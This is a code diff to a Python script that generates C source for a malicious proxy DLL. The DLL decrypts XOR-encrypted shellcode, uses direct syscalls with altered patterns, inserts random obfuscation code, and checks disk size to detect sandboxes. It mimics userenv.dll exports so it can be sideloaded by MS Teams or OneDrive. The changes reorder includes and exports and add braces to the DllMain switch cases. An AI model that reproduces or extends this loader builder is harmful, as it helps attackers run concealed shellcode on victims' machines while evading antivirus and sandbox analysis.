@@ -10,7 +10,7 @@ def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_h
     c_template = f"""
     #include <stdio.h>
     #include <stdlib.h>
-    #include "syscalls.h"
+    #include "syscalls_mem.h"
     #include <iostream>
     #include <cstring>
     #include <cstdio>
@@ -19,19 +19,22 @@ def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_h
     #include <cmath>
     #include <Windows.h>
     #include <iostream>
+    #include <string>
+    
+    using namespace std; 
 
     #define _CRT_SECURE_NO_DEPRECATE
     #pragma warning (disable : 4996)
+    
+    //here DLL exports are specified based an the user choice either MS Teams || OneDrive
+
+    {file_contents}
 
     //Here we specify the DLL exports of whatever dll we want to use in this case userenv.dll
     //We must use sharpdllproxy to auto make us a C file which will include all this exports.
     //In the Assembly code we used some nop instructions with the help of some registers which will change the pattern of how syswhispers calls the syscalls
     
     {obfuscator(secrets.choice(array),secrets.choice(size),1,0)}
-    
-    //here DLL exports are specified based an the user choice either MS Teams || OneDrive
-
-    {file_contents}
 
     BOOL executed = FALSE;
 
@@ -145,7 +148,7 @@ def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_h
         switch (ul_reason_for_call)
         {{
         case DLL_PROCESS_ATTACH:
-        
+        {{
             {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
             
             //sandbox check for harddisk size
@@ -161,18 +164,21 @@ def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_h
             CloseHandle(hThread);
             
             {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
-            
+            }}
         case DLL_THREAD_ATTACH:
-        
+        {{
             {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
+            }}
             break;
         case DLL_THREAD_DETACH:
-        
+        {{
             {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
+            }}
             break;
         case DLL_PROCESS_DETACH:
-        
+        {{
             {obfuscator(secrets.choice(array),secrets.choice(size),0,0)}
+            }}
             break;
         }}
         
